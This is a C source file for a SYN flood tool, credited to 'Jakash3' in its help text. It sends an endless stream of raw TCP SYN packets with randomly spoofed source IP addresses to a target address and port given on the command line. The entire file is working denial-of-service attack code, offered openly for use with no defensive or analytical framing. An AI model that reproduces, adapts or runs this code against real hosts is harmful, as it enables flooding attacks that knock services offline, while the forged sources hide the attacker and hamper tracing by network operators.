#include "tcpip.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

ushort csum(short* data, int len);
char* randip(char* dst);
ushort rand16();
uint rand32();

int sd;
    
void help() { printf("SYN flooder - by Jakash3\nArguments: IPV4_ADDR PORT\n"); exit(1); }
void quit(int sig) { close(sd); exit(0); }

int main(int argc, char** argv) {
    if (argc!=3) help();

    /* Map CTRL-C to quit() */
    struct sigaction sa;
    sa.sa_handler = &quit;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, 0);

    char rip[16];
    char packet[4096];
    struct iphdr ip;
    struct tcpph tph;
    struct tcphdr tcp;
    struct sockaddr_in sin;
    const int on = 1;

    memset(&packet, 0, 40);
    ip.ihl = 5;
    ip.ipv = 4;
    ip.tos = 0;
    ip.len = IPHDR_LEN + TCPHDR_LEN;
    ip.id = htons(rand16());
    ip.ttl = 64;
    ip.proto = IPPROTO_TCP;
    ip.src = (uint)inet_addr(randip(rip));
    ip.dst = (uint)inet_addr(argv[1]);
    ip.chksum = 0;
    ip.chksum = csum((short*)&ip, IPHDR_LEN);
    tcp.sport = htons((short)atoi(argv[2]));
    tcp.dport = htons((short)atoi(argv[2]));
    tcp.seq = htonl(rand32());
    tcp.offset = sizeof(struct tcphdr) / 4;
    tcp.flgs = TCP_SYN;
    tcp.chksum = 0;
    tph.src = ip.src;
    tph.dst = ip.dst;
    tph.zero = 0;
    tph.proto = IPPROTO_TCP;
    tph.tcp_len = sizeof(struct tcphdr);
    memmove(packet, &tph, TCPPH_LEN);
    memmove(packet + TCPPH_LEN, &tcp, TCPHDR_LEN);
    tcp.chksum = csum((short*)packet, TCPPH_LEN + TCPHDR_LEN);
    memmove(packet, &ip, IPHDR_LEN);
    memmove(packet + IPHDR_LEN, &tcp, TCPHDR_LEN);

    sd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd == -1) {
        printf("Failed to create socket. Error code: %d\n", errno);
        exit(1);
    }
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1) {
        printf("Failed to set socket options. Error code: %d\n", errno);
        exit(1);
    }
    sin.sin_family = AF_INET;
    sin.sin_port = htons(tcp.dport);
    memmove(&(sin.sin_addr), &(ip.dst), sizeof(struct in_addr));
    while (1) {
        if (sendto(sd, packet, ip.len, 0, (struct sockaddr*)&sin, sizeof(struct sockaddr)) == -1) {
            printf("Failed to send SYN packet(s). Error code: %d\n", errno);
            exit(1);
        } else {
            printf("Sent SYN packet with spoofed ip: %s\n", rip);
        }
        ip.id = htons(rand16());
        ip.src = (uint)inet_addr(randip(rip));
        ip.chksum = 0;
        ip.chksum = csum((short*)&ip, IPHDR_LEN);
        tph.src = ip.src;
        tcp.seq = htonl(rand32());
        tcp.chksum = 0;
        memmove(packet, &tph, TCPPH_LEN);
        memmove(packet + TCPPH_LEN, &tcp, TCPHDR_LEN);
        tcp.chksum = csum((short*)packet, TCPPH_LEN + TCPHDR_LEN);
        memmove(packet, &ip, IPHDR_LEN);
        memmove(packet + IPHDR_LEN, &tcp, TCPHDR_LEN);
    }
}

ushort csum(short* data, int len) {
    int sum = 0;
    for (; len > 1; len -= 2) sum += *data++;
    if (len == 1) sum += *(uchar*)data;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

/* The best I can do for generating a random ipv4 address */
char* randip(char* dst) {
    dst[0] = 0;
    int i, j, k;
    srandom(time(0));
    srand(random());
    srandom(rand());
    j = rand() + random();
    for (i = 0, k = 0; k < 4; i += strlen(dst + i), k++, j += ((rand() + (int)dst) % i) ^ time(0)) {
        srand((int)dst + i + k);
        srand(j + dst[i+k] + (int)&i + rand());
        j = rand() % 255;
        sprintf(dst + i, "%d.", j);
    }
    dst[i-1] = 0;
    return dst;
}

ushort rand16() {
    srandom(time(0));
    srand(random());
    srandom(rand());
    return (random() + rand() + time(0)) % 65535;
}

uint rand32() {
    srandom(time(0));
    srand(random());
    srandom(rand());
    return (random() + rand() & time(0));
}